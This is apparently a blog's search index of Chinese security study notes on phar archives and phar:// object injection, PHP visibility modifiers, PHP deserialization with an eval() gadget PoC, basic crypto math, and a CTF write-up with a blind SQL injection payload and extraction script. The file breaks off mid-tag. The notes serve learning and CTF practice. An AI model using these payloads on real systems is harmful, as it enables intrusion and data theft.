<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Phar以及phar对象注入</title>
      <link href="/2020/06/02/note14/"/>
      <url>/2020/06/02/note14/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h4><blockquote><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。</p><a id="more"></a><p>每个归档都包含三个部分：</p><ol><li>存根(Stub) —— 一个可以引导归档的PHP文件。存根必须包含<code>__HALT_COMPILER();</code>语句，并且默认存根拥有在不启用PHAR扩展的情况下运行PHAR文件的能力。</li><li>清单 —— 清单详细说明了存归档的内容。</li><li>文件内容 —— 归档中包含的原始文件</li></ol><p>另外，PHAR格式还可以包括用于验证PHAR完整性的签名。</p></blockquote><p>Phar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。</p><h4 id="生成一个phar文件"><a href="#生成一个phar文件" class="headerlink" title="生成一个phar文件"></a>生成一个phar文件</h4><p>首先开启php.ini的phar扩展</p><p><img src="/images/image-20200602174306490.png" alt="image-20200602174306490"></p><p>示例：</p><p>创建两个文件如下</p><p><img src="/images/image-20200602181914631.png" alt="image-20200602181914631"></p><p>createphar.php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);<span class="comment">//生成新的phar文件</span></span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="keyword">__DIR__</span>.<span class="string">'\\'</span>);<span class="comment">//源码目录</span></span><br><span class="line"><span class="comment">//$phar-&gt;compressFiles(Phar::GZ);可以选择添加压缩方式</span></span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'index.php'</span>));<span class="comment">//设置存根，没有设置这个存根文件的话，默认寻找的文件为index.php。</span></span><br></pre></td></tr></table></figure><p>生成</p><p><img src="/images/image-20200602183306239.png" alt="image-20200602183306239"></p><p>我们可以直接加载phar文件的单独文件：</p><p><img src="/images/image-20200602183654213.png" alt="image-20200602183654213"></p><p><img src="/images/image-20200602183718537.png" alt="image-20200602183718537"></p><p>当然也能还原(无压缩方式)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar-&gt;extractTo(<span class="string">'huanyuan'</span>);<span class="comment">//路径</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200602184946407.png" alt="image-20200602184946407"></p><h4 id="phar对象注入"><a href="#phar对象注入" class="headerlink" title="phar对象注入"></a>phar对象注入</h4><p>PHP文件操作允许使用各种URL协议去访问文件路径如data://，zlib://，或php://，phar://也是其中一种。</p><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><p>Phar文件可以包含序列化格式的元数据，<a href="https://www.freebuf.com/articles/web/182231.html" target="_blank" rel="noopener">扒张图</a></p><p><img src="https://image.3001.net/images/20180827/1535343254_5b837a96d90ac.png!small" alt="1.png"></p><p>所以如果我们通过 phar:// 对我们现有的Phar文件执行文件操作，则其序列化元数据将被反序列化。假如攻击者可以在<code>ìnclude()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等操作中控制完整的文件路径，就可以通过<code>phar://</code>注入并获得代码执行，造成严重的安全漏洞。</p><p>实战：<a href="https://blog.csdn.net/qq_43756333/article/details/106503047" target="_blank" rel="noopener">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的public、protected、private</title>
      <link href="/2020/05/26/note13/"/>
      <url>/2020/05/26/note13/</url>
      
        <content type="html"><![CDATA[<p>区别一下public，protected和private</p><a id="more"></a><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>public，protected和private称为“访问修饰符”，可以通过在声明前加上这些关键字来定义属性，方法或常量的可见性。</p><p>public：公有类型，可以在任何地方访问。</p><p>protected：受保护类型，只能在类本身内以及继承和父类中访问。</p><p>private：私有类型，只能由定义该成员的类访问。该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能               调用私有类型的属性和方法</p><p>举几个例子。</p><p>1.Public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pub</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $message = <span class="string">"你看见了我"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pub类的子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">pub</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> child;</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;message.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$obj-&gt;display();<span class="comment">//类内</span></span><br><span class="line">$obj-&gt;show();<span class="comment">//子类</span></span><br><span class="line">    <span class="comment">//都可调用</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200526161822746.png" alt="image-20200526161822746"></p><p>2.protected</p><p>把public改成protected，编译器提示：</p><p><img src="/images/image-20200526163125793.png" alt=""></p><p> 通过父类类型的变量,是不允许访问protected成员的。只调用其本身和子类则正常输出。</p><p><img src="/images/image-20200526165538604.png" alt="image-20200526165538604"></p><p>3.private</p><p>再改为private</p><p><img src="/images/image-20200526165749359.png" alt="image-20200526165749359"></p><p>只能由定义该成员的类访问，由于它只对类的内部成员可见，所以要利用它，一般都会是写一个public的方法，再返回这个属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pri</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $a = <span class="string">'self'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $other = <span class="keyword">new</span> <span class="keyword">self</span>();</span><br><span class="line">        $other-&gt;a = <span class="string">'这样你才能看见我'</span>;</span><br><span class="line">        var_dump($other-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> pri();</span><br><span class="line">$obj-&gt;test();</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200526171317806.png" alt="image-20200526171317806"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化初总结</title>
      <link href="/2020/05/23/note12/"/>
      <url>/2020/05/23/note12/</url>
      
        <content type="html"><![CDATA[<p>碰到过很多次反序列化的审计，一直都没系统地去看，这两天看了不少博客，自己小小总结一下。</p><a id="more"></a><h3 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h3><p>序列化把一个对象变成可存储，可传输的字符串，并且在转换过程中保存变量的值和数据格式，反序列化把序列化后的字符串还原回对象使用，通过这个过程，可以方便数据的传输和存储，使程序更具维护性。</p><p>对于PHP反序列化的过程，我们主要围绕两个函数：serialize()，unserialize()。</p><p>那么为什么会产生PHP反序列化漏洞利用呢，这就要讲到PHP中几个特殊函数了。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在PHP的语法中，有一些系统自带的方法名，均以双下划线开头，它们会在特定的情况下被调用，即所谓的魔法函数。常见的魔术方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="line">__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep: 序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="line">__wakeup: 反序列化恢复对象之前调用该方法</span><br><span class="line">__call:  当调用对象中不存在的方法会自动调用该方法。</span><br><span class="line">__get:   在调用私有属性的时候会自动执行</span><br><span class="line">__isset()： 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line">__unset()： 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_42751456/article/details/88758908" target="_blank" rel="noopener">这位师傅</a>的例子可以清晰的看到这些函数被调用的情况:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $variable = <span class="string">'BUZZ'</span>;</span><br><span class="line">    <span class="keyword">public</span> $variable2 = <span class="string">'OTHER'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printvariable</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;variable.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__construct'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__wakeup'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__sleep'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'variable'</span>,<span class="string">'variable2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象，回调用__construct</span></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//序列化一个对象，会调用__sleep</span></span><br><span class="line">$serialized = serialize($object);</span><br><span class="line"><span class="comment">//输出序列化后的字符串</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Serialized:'</span>.$serialized.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="comment">//重建对象，会调用__wakeup</span></span><br><span class="line">$object2 = unserialize($serialized);</span><br><span class="line"><span class="comment">//调用printvariable,会输出数据(BUZZ)</span></span><br><span class="line">$object2-&gt;printvariable();</span><br><span class="line"><span class="comment">//脚本结束，会调用__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200523140420068.png" alt="image-20200523140420068"></p><p>由此我们可以设想，如果服务器没对我们提交的序列化字符串进行检测，直接将变量放到这些魔术方法中，那么我们是不是可以控制反序列化进程，从而达到代码执行，getshell的目的呢，答案是肯定的。一道<a href="https://www.freebuf.com/column/161798.html" target="_blank" rel="noopener">这位师傅</a>的例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $handle;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $pid;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))&#123;</span><br><span class="line">        $user_data = unserialize(urldecode($_GET[<span class="string">'data'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析下代码，有两个类Example，Process，Example类中有一个__destruct()魔术方法的析构函数(PHP5引入了析构函数的概念，这类似于其它面向对象的语言)，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。Process类中有一个成员函数close()，其中包含eval函数，但其参数不可控。</p><p>在PHP审计过程中，应当注意一些危险函数是否外部可控以及有没有进行正确过滤，因此这里我们的重点在eval()，如果我们能够将其参数变为可控，那么我们就可以执行任意代码，$pid的控制通过close()函数，Example类的成员函数shutdown()可以调用close()，所以如果把$handle作为Process的一个类对象，那么就可以通过shutdown()调用Process中的close()进而使得$pid可控。按照从思路构造poc如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $handle;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> process();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $pid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pid = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Example();</span><br><span class="line">$payload = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure><p>生成payload为：</p><p><img src="/images/image-20200523152607619.png" alt="image-20200523152607619"></p><p>当我们序列化的字符串进行反序列化时就会按照我们的设定生成一个Example类对象，当脚本结束时自动调用__destruct()函数，然后调用shutdown()函数，此时$handle为process的类对象，所以接下来会调用process的close()函数，eval()就会执行，而$pid也可以进行设置，此时就造成了代码执行。这里用到了pop链的思想，留个坑。</p><p>传入参数getshell：</p><p><img src="/images/image-20200523152752906.png" alt="image-20200523152752906"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>反序列化不同类型的应用以及pop链的寻找构造还有待学习</li><li>该敲代码了</li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学中一些基本知识</title>
      <link href="/2020/05/10/note11/"/>
      <url>/2020/05/10/note11/</url>
      
        <content type="html"><![CDATA[<p>在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。</p><a id="more"></a><h3 id="最基本的求余"><a href="#最基本的求余" class="headerlink" title="最基本的求余"></a>最基本的求余</h3><p>(1) (a + b) mod p = (a mod p + b mod p) mod p<br>(2) (a -  b) mod p = (a mod p - b mod p) mod p<br>(3) (a * b) mod p = (a mod p * b mod p) mod p</p><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3><p>也称辗转相除法，计算两个正整数的最大公约数，当较小整数为0时，则表明上一次相除已除尽，所以上一次相除时的除数（当次输入的gcd函数中的较大数）是最大公约数。计算公式：</p><p>​                                                                    gcd(a,b) = gcd(b,a mod b)</p><p>a&gt;b且a mod b不为0。</p><p>python递归实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a,b = b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = gcd(<span class="number">6</span>,<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h3 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h3><p>正整数 a, n，如果有 ax = 1(mod n)，则称 x 的最小正整数解为 a 模 n的逆元。也就是说a和x的乘积模n得到的余数为1，</p><p>关于它的作用及推导过程：<a href="https://blog.csdn.net/weixin_43872728/article/details/99687168" target="_blank" rel="noopener">乘法逆元的作用</a></p><h3 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h3><p>在已知a,b两个正整数和欧几里得求得最大公约数d=gcd(a,b)的基础上，存在整数x,y使得ax+by=d成立，也就是 ax+by=gcd(a，b)，如果a,b都是素数，则ax+by=1成立。</p><p>python实现(求逆元)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myExtGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    a: 模的取值</span></span><br><span class="line"><span class="string">    b: 想求逆的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, gcd = myExtGCD(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> y, x-a//b*y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(myExtGCD(<span class="number">717</span>, <span class="number">73</span>)[<span class="number">1</span>] % <span class="number">717</span>)</span><br></pre></td></tr></table></figure><p>关于逆元的求解，也可直接导入gmpy2库的invert()函数，同样可得到结果，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert()</span><br><span class="line"></span><br><span class="line">ni = invert(a,b)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">a为想逆的值</span></span><br><span class="line"><span class="string">b为模的取值</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print(ni)</span><br></pre></td></tr></table></figure><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>当有两数a,p满足gcd(a,p)=1，p是质数时，则有 a^{p-1} = 1 (mod p)</p><p>这里可以变形一下，a*a^{p-2} = 1(mod p)</p><p>所以a^(p-2)就是a关于p的逆元，再用快速幂即可求得逆元(直接pow())</p><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>用希腊字母φ表示,φ(N)表示N的欧拉函数，通俗地理解为小于N且与N互质的数的个数(包含1).</p><p>通式：φ(n)=n<em>(1-1/p1)</em>(1-1/p2)<em>(1-1/p3)</em>(1-1/p4)……(1-1/pn)</p><p>(1)  p^k型:</p><p>若N是质数p(即N=p), φ(n)= φ(p)=p-p^(k-1)=p-1。</p><p>若N是质数p的k次幂(即N=p^k)，φ(n)=p^k-p^(k-1)=(p-1)p^(k-1)。</p><p>(2)mn型</p><p>设n为正整数，以φ(n)表示不超过n且与n互素的正整数的个数，称为n的欧拉函数值。若m,n互质，φ(mn)=(m-1)(n-1)=φ(m)φ(n)。</p><h3 id="欧拉定理及推论"><a href="#欧拉定理及推论" class="headerlink" title="欧拉定理及推论"></a>欧拉定理及推论</h3><p>欧拉定理: 若正整数a，n互质，则a^{φ(n)}≡1 (mod n)，φ(n)为欧拉函数</p><p>推论：若n=pq,p≠q都是素数,k是任意整数,则mk(p-1)(q-1)+1 ≡ m mod n</p><p>​           对任意0≤m≤n，只要选择e,d，满足ed=kφ(n)+1，即ed ≡ 1 mod φ(n) ，d ≡ e-1 mod φ(n)</p><p>待补充</p><p>…</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分法进行sql盲注</title>
      <link href="/2020/04/29/note10/"/>
      <url>/2020/04/29/note10/</url>
      
        <content type="html"><![CDATA[<p>在学sql盲注脚本的时候碰到了使用二分法盲注字段的情况，学习一下。</p><a id="more"></a><h4 id="环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="环境： [CISCN2019 华北赛区 Day2 Web1]Hack World"></a>环境： [CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>复现地址：<a href='https://buuoj.cn/' target="_blank" rel="noopener">BUUCTF</a></p><p>打开题目</p><p><img src="/images/image-20200429185128033.png" alt="image-20200429185128033"></p><p>直接告诉了flag在flag表和flag列里，让我们提交id。</p><p>这道题过滤了一些字段以及常用注入语句，可以用Burpsuite来fuzz测试一下,如下所示，长度为482的代表被过滤</p><p><img src="/images/image-20200429191528329.png" alt="image-20200429191528329"></p><p>最后使用的方法是异或注入，有关异或注入的原理，可参考<a href='https://www.jianshu.com/p/27df5c67157c' target="_blank" rel="noopener">异或注入</a></p><p>直接给出payload：1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>开始编写盲注脚本，这里思路有很多，有枚举法，二分法，还看到过北邮大佬的延时注入，最简单的一种是枚举，直接贴出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php"</span></span><br><span class="line">words = <span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(<span class="string">'----------------------------------------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):<span class="comment">#ascii值范围</span></span><br><span class="line">        data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">        re = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#如果回显为words内容，打印出j转换后的字符</span></span><br><span class="line">        <span class="keyword">if</span> words <span class="keyword">in</span> re:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>大概跑个5分钟,即得flag.</p><p><img src="/images/image-20200429215354204.png" 